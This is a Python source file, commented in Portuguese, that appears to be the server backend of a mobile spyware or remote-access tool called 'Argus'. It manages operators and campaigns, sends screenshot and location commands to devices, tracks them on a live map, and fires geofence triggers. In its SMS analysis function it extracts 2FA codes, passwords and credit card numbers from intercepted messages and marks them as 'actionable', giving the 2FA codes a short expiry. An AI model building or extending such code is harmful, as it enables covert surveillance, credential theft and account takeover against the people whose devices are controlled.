"""
Military Manager - Gerenciador de funcionalidades militares avançadas
Sistema Argus - Nível Militar
"""

import re
import json
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from math import radians, cos, sin, asin, sqrt
import uuid
import secrets

from database.backend.models import db, Device, Command
from database.backend.models_military import (
    Operator, Campaign, DeviceCampaign, CommandScript, ScriptExecution,
    GeoFence, GeoFenceTrigger, ThreatIntelligence, Analytics, MapTrackingPoint
)

logger = logging.getLogger(__name__)

class MilitaryManager:
    """
    Gerenciador central de funcionalidades militares
    """
    
    def __init__(self, app=None):
        self.app = app
        if app:
            self.init_app(app)
    
    def init_app(self, app):
        """Inicializa com Flask app"""
        self.app = app
    
    # ====================== MULTI-TENANT OPERATIONS ======================
    
    def create_operator(self, name: str, code_name: str, organization: str = None,
                       permission_level: int = 1, max_devices: int = 50) -> Operator:
        """
        Cria novo operador no sistema multi-tenant
        """
        try:
            # Gerar API key e secret
            api_key = f"argus_{secrets.token_urlsafe(32)}"
            api_secret = secrets.token_urlsafe(48)
            
            operator = Operator(
                name=name,
                code_name=code_name,
                organization=organization,
                api_key=api_key,
                permission_level=permission_level,
                max_devices=max_devices
            )
            operator.set_api_secret(api_secret)
            
            db.session.add(operator)
            db.session.commit()
            
            logger.info(f"Operador criado: {code_name} (ID: {operator.operator_id})")
            
            # Retornar operador com secret (apenas nesta vez)
            operator.api_secret_plain = api_secret
            return operator
            
        except Exception as e:
            db.session.rollback()
            logger.error(f"Erro ao criar operador: {e}")
            raise
    
    def create_campaign(self, operator_id: int, name: str, code_name: str,
                       description: str = None, priority: str = 'normal') -> Campaign:
        """
        Cria nova campanha de operação
        """
        try:
            campaign = Campaign(
                operator_id=operator_id,
                name=name,
                code_name=code_name,
                description=description,
                priority=priority,
                status='planning'
            )
            
            db.session.add(campaign)
            db.session.commit()
            
            logger.info(f"Campanha criada: {code_name} (Operador ID: {operator_id})")
            return campaign
            
        except Exception as e:
            db.session.rollback()
            logger.error(f"Erro ao criar campanha: {e}")
            raise
    
    def assign_device_to_campaign(self, device_id: int, campaign_id: int, role: str = None) -> DeviceCampaign:
        """
        Atribui dispositivo a uma campanha
        """
        try:
            device_campaign = DeviceCampaign(
                device_id=device_id,
                campaign_id=campaign_id,
                role=role,
                status='active'
            )
            
            db.session.add(device_campaign)
            
            # Atualizar contador da campanha
            campaign = Campaign.query.get(campaign_id)
            if campaign:
                campaign.total_devices += 1
            
            db.session.commit()
            
            logger.info(f"Dispositivo {device_id} atribuído à campanha {campaign_id}")
            return device_campaign
            
        except Exception as e:
            db.session.rollback()
            logger.error(f"Erro ao atribuir dispositivo à campanha: {e}")
            raise
    
    def get_operator_devices(self, operator_id: int) -> List[Device]:
        """
        Retorna todos os dispositivos de um operador
        """
        operator = Operator.query.get(operator_id)
        if operator:
            return operator.devices
        return []
    
    # ====================== COMMAND SCRIPTING ENGINE ======================
    
    def create_command_script(self, name: str, script_steps: List[Dict],
                            campaign_id: int = None, description: str = None,
                            repeat_count: int = 1, repeat_interval: int = 0) -> CommandScript:
        """
        Cria script de comandos sequenciais
        
        Exemplo de script_steps:
        [
            {"step": 1, "command": "screenshot", "data": {}, "delay": 0},
            {"step": 2, "command": "wait", "seconds": 300},
            {"step": 3, "command": "location", "data": {"accuracy": "high"}, "delay": 0}
        ]
        """
        try:
            script = CommandScript(
                name=name,
                description=description,
                campaign_id=campaign_id,
                script_steps=script_steps,
                repeat_count=repeat_count,
                repeat_interval_seconds=repeat_interval,
                is_active=True
            )
            
            db.session.add(script)
            db.session.commit()
            
            logger.info(f"Script criado: {name} (ID: {script.script_id})")
            return script
            
        except Exception as e:
            db.session.rollback()
            logger.error(f"Erro ao criar script: {e}")
            raise
    
    def execute_script(self, script_id: str, device_id: int) -> ScriptExecution:
        """
        Inicia execução de script em dispositivo
        """
        try:
            script = CommandScript.query.filter_by(script_id=script_id).first()
            if not script or not script.is_active:
                raise ValueError("Script não encontrado ou inativo")
            
            # Criar execução
            execution = ScriptExecution(
                script_id=script.id,
                device_id=device_id,
                status='pending',
                total_steps=len(script.script_steps),
                current_step=0
            )
            
            db.session.add(execution)
            db.session.commit()
            
            logger.info(f"Execução de script iniciada: {script.name} em dispositivo {device_id}")
            
            # TODO: Iniciar processamento assíncrono do script
            # self._process_script_execution(execution.id)
            
            return execution
            
        except Exception as e:
            db.session.rollback()
            logger.error(f"Erro ao executar script: {e}")
            raise
    
    def get_script_execution_status(self, execution_id: str) -> Optional[ScriptExecution]:
        """
        Retorna status de execução de script
        """
        return ScriptExecution.query.filter_by(execution_id=execution_id).first()
    
    # ====================== GEO-FENCING & TRIGGERS ======================
    
    def create_geofence(self, name: str, center_lat: float, center_lon: float,
                       radius_meters: float, campaign_id: int = None,
                       trigger_on_enter: bool = True, trigger_on_exit: bool = False,
                       action_commands: List[Dict] = None) -> GeoFence:
        """
        Cria geo-cerca circular
        """
        try:
            geofence = GeoFence(
                name=name,
                campaign_id=campaign_id,
                fence_type='circle',
                center_latitude=center_lat,
                center_longitude=center_lon,
                radius_meters=radius_meters,
                trigger_on_enter=trigger_on_enter,
                trigger_on_exit=trigger_on_exit,
                action_commands=action_commands,
                is_active=True
            )
            
            db.session.add(geofence)
            db.session.commit()
            
            logger.info(f"Geo-fence criada: {name} (ID: {geofence.geofence_id})")
            return geofence
            
        except Exception as e:
            db.session.rollback()
            logger.error(f"Erro ao criar geo-fence: {e}")
            raise
    
    def check_geofence_triggers(self, device_id: int, latitude: float, longitude: float) -> List[GeoFenceTrigger]:
        """
        Verifica se localização disparou alguma geo-cerca
        """
        triggers_fired = []
        
        try:
            device = Device.query.get(device_id)
            if not device:
                return triggers_fired
            
            # Buscar todas geo-fences ativas
            geofences = GeoFence.query.filter_by(is_active=True).all()
            
            for geofence in geofences:
                # Verificar se é fence circular
                if geofence.fence_type == 'circle':
                    distance = self._haversine_distance(
                        latitude, longitude,
                        geofence.center_latitude, geofence.center_longitude
                    )
                    
                    is_inside = distance <= geofence.radius_meters
                    
                    # Verificar se dispositivo estava dentro/fora antes
                    was_inside = False
                    if device.latitude and device.longitude:
                        prev_distance = self._haversine_distance(
                            device.latitude, device.longitude,
                            geofence.center_latitude, geofence.center_longitude
                        )
                        was_inside = prev_distance <= geofence.radius_meters
                    
                    # Detectar entrada
                    if geofence.trigger_on_enter and is_inside and not was_inside:
                        trigger = self._create_geofence_trigger(
                            geofence.id, device_id, 'enter', latitude, longitude
                        )
                        triggers_fired.append(trigger)
                        logger.info(f"Geo-fence ENTER: {geofence.name} - Device {device_id}")
                    
                    # Detectar saída
                    elif geofence.trigger_on_exit and not is_inside and was_inside:
                        trigger = self._create_geofence_trigger(
                            geofence.id, device_id, 'exit', latitude, longitude
                        )
                        triggers_fired.append(trigger)
                        logger.info(f"Geo-fence EXIT: {geofence.name} - Device {device_id}")
            
            return triggers_fired
            
        except Exception as e:
            logger.error(f"Erro ao verificar geo-fences: {e}")
            return triggers_fired
    
    def _create_geofence_trigger(self, geofence_id: int, device_id: int,
                                trigger_type: str, lat: float, lon: float) -> GeoFenceTrigger:
        """
        Cria registro de trigger de geo-fence
        """
        trigger = GeoFenceTrigger(
            geofence_id=geofence_id,
            device_id=device_id,
            trigger_type=trigger_type,
            trigger_latitude=lat,
            trigger_longitude=lon,
            execution_status='pending'
        )
        
        db.session.add(trigger)
        
        # Atualizar contadores da geo-fence
        geofence = GeoFence.query.get(geofence_id)
        if geofence:
            geofence.trigger_count += 1
            geofence.last_triggered_at = datetime.utcnow()
        
        db.session.commit()
        
        # TODO: Executar ações associadas à geo-fence
        # self._execute_geofence_actions(geofence, device_id)
        
        return trigger
    
    def _haversine_distance(self, lat1: float, lon1: float, lat2: float, lon2: float) -> float:
        """
        Calcula distância entre dois pontos em metros usando fórmula de Haversine
        """
        # Raio da Terra em metros
        R = 6371000
        
        # Converter para radianos
        lat1, lon1, lat2, lon2 = map(radians, [lat1, lon1, lat2, lon2])
        
        # Diferenças
        dlat = lat2 - lat1
        dlon = lon2 - lon1
        
        # Fórmula de Haversine
        a = sin(dlat/2)**2 + cos(lat1) * cos(lat2) * sin(dlon/2)**2
        c = 2 * asin(sqrt(a))
        
        return R * c
    
    # ====================== THREAT INTELLIGENCE ======================
    
    def analyze_sms_for_intelligence(self, device_id: int, sms_text: str,
                                    phone_number: str, sms_id: int) -> List[ThreatIntelligence]:
        """
        Analisa SMS para detectar informações sensíveis
        """
        intelligence_found = []
        
        try:
            # Detectar códigos 2FA
            # Padrões: "123456", "código: 123456", "Your code is 123456"
            patterns_2fa = [
                r'\b(\d{4,8})\b',  # Códigos numéricos 4-8 dígitos
                r'código[:\s]+(\d{4,8})',
                r'code[:\s]+(\d{4,8})',
                r'OTP[:\s]+(\d{4,8})',
                r'PIN[:\s]+(\d{4})'
            ]
            
            for pattern in patterns_2fa:
                matches = re.finditer(pattern, sms_text, re.IGNORECASE)
                for match in matches:
                    code = match.group(1) if match.lastindex >= 1 else match.group(0)
                    
                    intel = ThreatIntelligence(
                        device_id=device_id,
                        intel_type='2fa_code',
                        intel_category='authentication',
                        raw_data=sms_text,
                        extracted_value=code,
                        source_type='sms',
                        source_id=sms_id,
                        confidence_score=0.85,
                        risk_level='high',
                        is_actionable=True,
                        expires_at=datetime.utcnow() + timedelta(minutes=10)
                    )
                    
                    db.session.add(intel)
                    intelligence_found.append(intel)
                    logger.info(f"2FA code detected: {code[:2]}*** from device {device_id}")
            
            # Detectar senhas
            password_patterns = [
                r'senha[:\s]+([^\s]{6,})',
                r'password[:\s]+([^\s]{6,})',
                r'pass[:\s]+([^\s]{6,})'
            ]
            
            for pattern in password_patterns:
                matches = re.finditer(pattern, sms_text, re.IGNORECASE)
                for match in matches:
                    password = match.group(1)
                    
                    intel = ThreatIntelligence(
                        device_id=device_id,
                        intel_type='password',
                        intel_category='authentication',
                        raw_data=sms_text,
                        extracted_value=password,
                        source_type='sms',
                        source_id=sms_id,
                        confidence_score=0.75,
                        risk_level='critical',
                        is_actionable=True
                    )
                    
                    db.session.add(intel)
                    intelligence_found.append(intel)
                    logger.info(f"Password detected from device {device_id}")
            
            # Detectar cartões de crédito
            card_pattern = r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b'
            matches = re.finditer(card_pattern, sms_text)
            for match in matches:
                card_number = match.group(0)
                
                intel = ThreatIntelligence(
                    device_id=device_id,
                    intel_type='credit_card',
                    intel_category='financial',
                    raw_data=sms_text,
                    extracted_value=card_number,
                    source_type='sms',
                    source_id=sms_id,
                    confidence_score=0.90,
                    risk_level='critical',
                    is_actionable=True
                )
                
                db.session.add(intel)
                intelligence_found.append(intel)
                logger.info(f"Credit card detected from device {device_id}")
            
            if intelligence_found:
                db.session.commit()
            
            return intelligence_found
            
        except Exception as e:
            db.session.rollback()
            logger.error(f"Erro ao analisar intelligence: {e}")
            return intelligence_found
    
    def get_actionable_intelligence(self, operator_id: int = None,
                                   intel_type: str = None) -> List[ThreatIntelligence]:
        """
        Retorna inteligência acionável
        """
        query = ThreatIntelligence.query.filter_by(
            is_actionable=True,
            is_processed=False
        )
        
        if intel_type:
            query = query.filter_by(intel_type=intel_type)
        
        # Filtrar por operador se necessário
        if operator_id:
            # TODO: Join com devices e operators
            pass
        
        return query.order_by(ThreatIntelligence.detected_at.desc()).all()
    
    # ====================== REAL-TIME MAP TRACKING ======================
    
    def update_map_tracking(self, device_id: int, latitude: float, longitude: float,
                          accuracy: float = None, battery_level: float = None,
                          speed: float = None) -> MapTrackingPoint:
        """
        Atualiza ponto de tracking no mapa em tempo real
        """
        try:
            # Marcar pontos antigos como não-current
            MapTrackingPoint.query.filter_by(
                device_id=device_id,
                is_current=True
            ).update({'is_current': False})
            
            # Criar novo ponto
            point = MapTrackingPoint(
                device_id=device_id,
                latitude=latitude,
                longitude=longitude,
                accuracy=accuracy,
                battery_level=battery_level,
                speed=speed,
                is_current=True
            )
            
            db.session.add(point)
            db.session.commit()
            
            return point
            
        except Exception as e:
            db.session.rollback()
            logger.error(f"Erro ao atualizar map tracking: {e}")
            raise
    
    def get_current_device_positions(self, operator_id: int = None) -> List[Dict]:
        """
        Retorna posições atuais de todos os dispositivos para mapa
        """
        try:
            query = MapTrackingPoint.query.filter_by(is_current=True)
            
            # TODO: Filtrar por operador
            
            points = query.all()
            
            return [point.to_dict() for point in points]
            
        except Exception as e:
            logger.error(f"Erro ao buscar posições de dispositivos: {e}")
            return []
    
    # ====================== ANALYTICS & METRICS ======================
    
    def record_metric(self, metric_type: str, metric_category: str,
                     value: float, unit: str = None,
                     operator_id: int = None, campaign_id: int = None,
                     device_id: int = None, tags: Dict = None) -> Analytics:
        """
        Registra métrica para analytics (Grafana/Kibana)
        """
        try:
            metric = Analytics(
                metric_type=metric_type,
                metric_category=metric_category,
                metric_value=value,
                metric_unit=unit,
                operator_id=operator_id,
                campaign_id=campaign_id,
                device_id=device_id,
                tags=tags
            )
            
            db.session.add(metric)
            db.session.commit()
            
            return metric
            
        except Exception as e:
            db.session.rollback()
            logger.error(f"Erro ao registrar métrica: {e}")
            raise
    
    def get_metrics_timeseries(self, metric_type: str, start_time: datetime,
                              end_time: datetime = None,
                              operator_id: int = None) -> List[Analytics]:
        """
        Retorna série temporal de métricas para gráficos
        """
        if not end_time:
            end_time = datetime.utcnow()
        
        query = Analytics.query.filter(
            Analytics.metric_type == metric_type,
            Analytics.timestamp >= start_time,
            Analytics.timestamp <= end_time
        )
        
        if operator_id:
            query = query.filter_by(operator_id=operator_id)
        
        return query.order_by(Analytics.timestamp.asc()).all()
    
    def get_dashboard_analytics(self, operator_id: int = None) -> Dict:
        """
        Retorna analytics agregados para dashboard
        """
        try:
            now = datetime.utcnow()
            last_24h = now - timedelta(hours=24)
            
            # Total de dispositivos
            device_query = Device.query
            if operator_id:
                device_query = device_query.filter_by(operator_id=operator_id)
            
            total_devices = device_query.count()
            online_devices = device_query.filter_by(status='online').count()
            
            # Comandos (últimas 24h)
            command_query = Command.query.filter(Command.created_at >= last_24h)
            # TODO: Filtrar por operador
            
            total_commands = command_query.count()
            successful_commands = command_query.filter_by(status='executed').count()
            
            # Taxa de sucesso
            success_rate = (successful_commands / total_commands * 100) if total_commands > 0 else 0
            
            # Intelligence coletada (últimas 24h)
            intel_query = ThreatIntelligence.query.filter(
                ThreatIntelligence.detected_at >= last_24h
            )
            
            total_intelligence = intel_query.count()
            actionable_intel = intel_query.filter_by(is_actionable=True, is_processed=False).count()
            
            return {
                'devices': {
                    'total': total_devices,
                    'online': online_devices,
                    'offline': total_devices - online_devices,
                    'online_percentage': (online_devices / total_devices * 100) if total_devices > 0 else 0
                },
                'commands': {
                    'total_24h': total_commands,
                    'successful_24h': successful_commands,
                    'failed_24h': total_commands - successful_commands,
                    'success_rate': success_rate
                },
                'intelligence': {
                    'total_24h': total_intelligence,
                    'actionable': actionable_intel
                },
                'timestamp': now.isoformat()
            }
            
        except Exception as e:
            logger.error(f"Erro ao gerar analytics: {e}")
            return {}

